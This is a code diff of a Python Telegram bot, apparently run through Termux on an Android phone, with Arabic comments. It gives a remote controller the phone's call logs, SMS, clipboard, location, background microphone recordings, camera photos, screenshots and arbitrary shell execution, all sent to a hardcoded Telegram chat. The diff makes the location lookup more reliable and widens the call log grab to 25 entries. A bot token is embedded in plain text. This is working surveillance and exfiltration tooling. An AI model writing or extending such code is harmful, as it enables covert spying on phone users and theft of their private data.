@@ -9,9 +9,11 @@ TOKEN = "8834957624:AAFbfeGveFu5xUgbsx7Dyh3YBHJx6cuIjKo"
 MY_CHAT_ID = 1674108077
 BASE_DIR = "/data/data/com.termux/files/home"
 
+# حالات تتبع المهام والعتاد
 is_recording = False
 recording_lock = threading.Lock()
 current_recording_process = None
+is_torch_on = False
 
 # ================= دالة مركزية للتعامل مع API تليجرام =================
 def telegram_api(method, payload=None, files=None):
@@ -34,7 +36,7 @@ def send_main_menu(chat_id, text="✨ *القائمة الرئيسية جاهز�
     keyboard = {
         "inline_keyboard": [
             [
-                {"text": "📱 سجل المكالمات", "callback_data": "/calls"},
+                {"text": "📱 سجل المكالمات (25)", "callback_data": "/calls"},
                 {"text": "🎙️ تسجيل صوتي", "callback_data": "/mic_menu"}
             ],
             [
@@ -46,7 +48,7 @@ def send_main_menu(chat_id, text="✨ *القائمة الرئيسية جاهز�
                 {"text": "📨 رسائل SMS", "callback_data": "/sms"}
             ],
             [
-                {"text": "💡 الكشاف (تشغيل/إيقاف)", "callback_data": "/torch"},
+                {"text": "💡 الكشاف (تبديل)", "callback_data": "/torch"},
                 {"text": "📋 النص المنسوخ", "callback_data": "/clipboard"}
             ],
             [
@@ -59,7 +61,7 @@ def send_main_menu(chat_id, text="✨ *القائمة الرئيسية جاهز�
             ],
             [
                 {"text": "📍 الموقع الجغرافي", "callback_data": "/location"},
-                {"text": "🔔 جرس إنذار (Ring)", "callback_data": "/ring"}
+                {"text": "🔔 إنذار الهاتف (Ring)", "callback_data": "/ring"}
             ],
             [
                 {"text": "🛑 إيقاف المهمة الحالية", "callback_data": "/cancel"},
@@ -100,7 +102,7 @@ def send_mic_duration_keyboard(chat_id):
         "reply_markup": keyboard
     })
 
-# ================= وظائف الميكروفون والصوت =================
+# ================= وظائف الميكروفون =================
 def background_mic_task(chat_id, duration_seconds):
     global is_recording, current_recording_process
     audio_path = os.path.join(BASE_DIR, "mic_recording.m4a")
@@ -115,7 +117,6 @@ def background_mic_task(chat_id, duration_seconds):
         duration_desc = f"{duration_seconds} ثانية" if duration_seconds < 60 else f"{duration_seconds // 60} دقيقة"
         send_message(chat_id, f"🎙️ جاري التسجيل في الخلفية لمدة *{duration_desc}*...\n💡 يمكنك الضغط على *إيقاف المهمة الحالية* لإنهائه مبكراً.")
 
-        # تشغيل أمر التسجيل في عملية مستقلة
         current_recording_process = subprocess.Popen(
             f"termux-microphone-record -f {audio_path}",
             shell=True
@@ -128,20 +129,18 @@ def background_mic_task(chat_id, duration_seconds):
             time.sleep(1)
             elapsed += 1
 
-        # إيقاف عملية التسجيل في Termux
         subprocess.run("termux-microphone-record -q", shell=True)
         if current_recording_process:
             current_recording_process.terminate()
         time.sleep(1)
 
-        # التحقق والإرسال
         if os.path.exists(audio_path) and os.path.getsize(audio_path) > 0:
             send_message(chat_id, "📤 يتم الآن رفع وإرسال الملف الصوتي...")
             with open(audio_path, 'rb') as audio_file:
                 telegram_api("sendAudio", payload={"chat_id": chat_id}, files={"audio": audio_file})
             os.remove(audio_path)
         else:
-            send_message(chat_id, "⚠️ لم يتم حفظ ملف صوتي صالح (ربما تم الإلغاء مبكراً جداً أو إذن الميكروفون معطل).")
+            send_message(chat_id, "⚠️ لم يتم حفظ ملف صوتي صالح (تأكد من إذن الميكروفون).")
 
     except Exception as e:
         send_message(chat_id, f"❌ خطأ أثناء التسجيل: {e}")
@@ -152,7 +151,9 @@ def background_mic_task(chat_id, duration_seconds):
         send_main_menu(chat_id)
 
 def cancel_current_task(chat_id):
-    global is_recording, current_recording_process
+    global is_recording, current_recording_process, is_torch_on
+    action_taken = False
+
     if is_recording:
         is_recording = False
         try:
@@ -161,12 +162,20 @@ def cancel_current_task(chat_id):
                 current_recording_process.terminate()
         except:
             pass
-        send_message(chat_id, "🛑 تم إلغاء التسجيل الجاري وحفظ الجزء المسجل إن وجد.")
+        action_taken = True
+
+    if is_torch_on:
+        subprocess.run("termux-torch off", shell=True)
+        is_torch_on = False
+        action_taken = True
+
+    if action_taken:
+        send_message(chat_id, "🛑 تم إيقاف كافة العمليات النشطة وإطفاء الكشاف.")
     else:
         send_message(chat_id, "ℹ️ لا توجد مهام جارية لإلغائها.")
     send_main_menu(chat_id)
 
-# ================= وظائف التقارير والنظام =================
+# ================= وظائف التقارير والعتاد =================
 def execute_termux_cmd(cmd, is_json=True):
     try:
         result = subprocess.check_output(cmd, shell=True, timeout=15)
@@ -176,15 +185,16 @@ def execute_termux_cmd(cmd, is_json=True):
 
 def get_call_logs_report():
     try:
-        calls = execute_termux_cmd("termux-call-log -l 10")
+        # جلب 25 مكالمة بدلاً من 10
+        calls = execute_termux_cmd("termux-call-log -l 25")
         if not isinstance(calls, list) or not calls:
-            return "📱 *سجل المكالمات:* لا توجد سجلات متاحة."
+            return "📱 *سجل المكالمات:* لا توجد سجلات متاحة أو أن إذن المكالمات محظور."
 
-        report = "📱 *آخر 10 مكالمات:*\n" + "—" * 20 + "\n\n"
+        report = "📱 *آخر 25 مكالمة مسجلة:*\n" + "—" * 20 + "\n\n"
         for idx, call in enumerate(reversed(calls), start=1):
             name = str(call.get('name') or "").strip()
             number = str(call.get('phone_number') or call.get('number') or "").strip()
-            
+
             ignore = ['unknown', 'unknown caller', 'null', 'none', '-1', '']
             if name.lower() in ignore: name = ""
             if number.lower() in ignore: number = ""
@@ -197,6 +207,59 @@ def get_call_logs_report():
         return report
     except Exception as e:
         return f"❌ خطأ: {e}"
+
+def toggle_torch():
+    global is_torch_on
+    try:
+        if is_torch_on:
+            subprocess.run("termux-torch off", shell=True, timeout=5)
+            is_torch_on = False
+            return "🌑 تم إطفاء الكشاف."
+        else:
+            subprocess.run("termux-torch on", shell=True, timeout=5)
+            is_torch_on = True
+            return "💡 تم تشغيل الكشاف."
+    except Exception as e:
+        return f"❌ خطأ في التحكم بالكشاف: {e}"
+
+def play_ringtone():
+    try:
+        # 1. ضبط الصوت على الحد الأقصى للموسيقى والرنين
+        subprocess.run("termux-volume music 15", shell=True)
+        subprocess.run("termux-volume ring 15", shell=True)
+        # 2. تفعيل الاهتزاز لمدة 3 ثوانٍ
+        subprocess.run("termux-vibrate -f -d 3000", shell=True)
+        # 3. إطلاق صوت تنبيه عبر النطق
+        subprocess.run('termux-tts-speak -p 1.3 -r 1.0 "تنبيه! إنذار تحديد موقع الهاتف"', shell=True)
+        return "🔔 تم إطلاق الإنذار الصوتي ورفع الصوت وتفعيل الاهتزاز بنجاح."
+    except Exception as e:
+        return f"❌ خطأ في تشغيل الإنذار: {e}"
+
+def get_location_report():
+    try:
+        # المحاولة 1: الاعتماد على Network (سريع جداً ويعمل بكفاءة داخل المنازل والمباني)
+        loc_res = subprocess.check_output("termux-location -p network -r once", shell=True, timeout=12)
+        loc = json.loads(loc_res.decode('utf-8', errors='ignore'))
+    except Exception:
+        try:
+            # المحاولة 2: اللجوء لـ GPS في حال تعذر الشبكة
+            loc_res = subprocess.check_output("termux-location -p gps -r once", shell=True, timeout=15)
+            loc = json.loads(loc_res.decode('utf-8', errors='ignore'))
+        except Exception as e:
+            return f"❌ تعذر تحديد الموقع: تأكد من تفعيل الـ GPS وضبط إذن الموقع لتطبيق Termux و Termux:API على 'السماح طوال الوقت'.\nالخطأ: {e}"
+
+    if isinstance(loc, dict) and loc.get('latitude') and loc.get('longitude'):
+        lat, lon = loc.get('latitude'), loc.get('longitude')
+        acc = loc.get('accuracy', 'غير محدد')
+        provider = loc.get('provider', 'Network/GPS')
+        return f"📍 *تم تحديد الموقع بنجاح:*\n—" * 15 + f"\n📡 المصدر: `{provider}` (دقة التحديد: {acc} متر)\n🔗 [عرض على خرائط Google](https://maps.google.com/?q={lat},{lon})"
+    return "❌ لم ترسل خدمة الموقع إحداثيات صالحة."
+
+def get_clipboard_report():
+    res = execute_termux_cmd("termux-clipboard-get", is_json=False).strip()
+    if res:
+        return f"📋 *النص المنسوخ حالياً في الهاتف:*\n\n`{res}`"
+    return "📋 *الحافظة فارغة.*\n\n💡 *ملاحظة:* يمنع أندرويد قراءة الحافظة أثناء عمل التطبيقات في الخلفية. ستظهر البيانات فور فتح واجهة Termux."
 
 def get_sms_report():
     try:
@@ -244,36 +307,7 @@ def get_volume_report():
         report += f"🔹 {v.get('stream')}: `{v.get('volume')}/{v.get('max_volume')}`\n"
     return report
 
-def get_location_report():
-    try:
-        loc = execute_termux_cmd("termux-location -p gps -c 1")
-        if isinstance(loc, dict) and loc.get('latitude') and loc.get('longitude'):
-            lat, lon = loc.get('latitude'), loc.get('longitude')
-            return f"📍 *تم تحديد الموقع بنجاح:*\n🔗 [عرض على خرائط Google](https://maps.google.com/?q={lat},{lon})"
-        return "❌ تعذر الحصول على إحداثيات GPS، تأكد من تفعيل الموقع."
-    except Exception as e:
-        return f"❌ خطأ: {e}"
-
-def get_clipboard_report():
-    res = execute_termux_cmd("termux-clipboard-get", is_json=False)
-    return f"📋 *النص المنسوخ حالياً:*\n\n`{res}`" if res else "❌ الحافظة فارغة."
-
-def toggle_torch():
-    try:
-        subprocess.run("termux-torch on", shell=True, timeout=5)
-        return "💡 تم تشغيل الكشاف."
-    except:
-        subprocess.run("termux-torch off", shell=True, timeout=5)
-        return "💡 تم إيقاف الكشاف."
-
-def play_ringtone():
-    try:
-        subprocess.run("termux-media-player play ringtone", shell=True)
-        return "🔔 تم تشغيل نغمة الرنين في الجهاز."
-    except Exception as e:
-        return f"❌ خطأ: {e}"
-
-# ================= وظائف الصور والشاشة =================
+# ================= وظائف الوسائط =================
 def take_media_task(chat_id, media_type, camera_id="0"):
     file_name = "screen.png" if media_type == "screenshot" else f"photo_{camera_id}.jpg"
     file_path = os.path.join(BASE_DIR, file_name)
@@ -299,7 +333,7 @@ def take_media_task(chat_id, media_type, camera_id="0"):
                 telegram_api(method, payload={"chat_id": chat_id}, files={field: file_data})
             os.remove(file_path)
         else:
-            send_message(chat_id, "❌ فشل التقاط الصورة/الشاشة.")
+            send_message(chat_id, "❌ فشل الالتقاط.")
     except Exception as e:
         send_message(chat_id, f"❌ حدث خطأ: {e}")
     finally:
@@ -353,7 +387,7 @@ def main():
                             output = execute_termux_cmd(cmd, is_json=False)
                             send_message(chat_id, f"🖥️ *النتيجة:*\n```\n{output}\n```")
 
-                        # 2. إدارة مهام التسجيل الصوتي
+                        # 2. مهام التسجيل الصوتي
                         elif text == "/mic_menu":
                             if is_recording:
                                 send_message(chat_id, "⚠️ الهاتف يسجل حالياً بالفعل!")
@@ -380,7 +414,7 @@ def main():
                         elif text == "/screenshot":
                             threading.Thread(target=take_media_task, args=(chat_id, "screenshot")).start()
 
-                        # 4. تقارير النظام والعتاد
+                        # 4. التقارير والعتاد
                         elif text == "/calls":
                             threading.Thread(target=handle_task, args=(chat_id, get_call_logs_report)).start()
                         elif text == "/sms":
@@ -394,6 +428,7 @@ def main():
                         elif text == "/volume":
                             threading.Thread(target=handle_task, args=(chat_id, get_volume_report)).start()
                         elif text == "/location":
+                            send_message(chat_id, "📍 جاري تحديد الموقع عبر الشبكة والأقمار...")
                             threading.Thread(target=handle_task, args=(chat_id, get_location_report)).start()
                         elif text == "/clipboard":
                             threading.Thread(target=handle_task, args=(chat_id, get_clipboard_report)).start()
